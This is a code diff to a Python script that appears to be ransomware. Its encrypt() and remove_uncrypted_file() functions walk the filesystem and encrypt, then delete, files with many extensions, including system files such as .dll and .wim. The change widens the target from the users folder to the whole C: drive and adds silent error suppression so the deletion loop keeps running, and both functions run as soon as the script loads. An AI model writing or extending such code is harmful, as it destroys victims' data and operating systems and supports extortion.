@@ -32,7 +32,7 @@ def resource_path(relative_path):
 
 # Encrypte file
 def encrypt():
-    for root_path, dirs, files in os.walk("C:\\Users\\"):
+    for root_path, dirs, files in os.walk("C:\\"):
         for file in files:
             try:
                 if file.endswith((".txt", ".py", ".docx", ".csv", ".bin", ".bat", ".dll", ".ini", ".mui", ".wim", ".log", ".bmp", ".bak")):  # The arg can be a tuple of suffixes to look for
@@ -52,12 +52,15 @@ encrypt()
 
 # Remove Uncrypted File
 def remove_uncrypted_file():
-    for root_path, dirs, files in os.walk("C:\\Users\\"):
+    for root_path, dirs, files in os.walk("C:\\"):
         for file in files:
-            if file.endswith((".txt", ".py", ".docx", ".csv", ".bin", ".bat", ".dll", ".ini", ".mui", ".wim", ".log", ".bmp", ".bak")):  # The arg can be a tuple of suffixes to look for
-                unique_file = os.path.join(file)
-                unique_path = os.path.join(root_path + "/")
-                os.remove(unique_path + unique_file)
+            try:
+                if file.endswith((".txt", ".py", ".docx", ".csv", ".bin", ".bat", ".dll", ".ini", ".mui", ".wim", ".log", ".bmp", ".bak")):  # The arg can be a tuple of suffixes to look for
+                    unique_file = os.path.join(file)
+                    unique_path = os.path.join(root_path + "/")
+                    os.remove(unique_path + unique_file)
+            except:
+                pass
 
 remove_uncrypted_file()
 
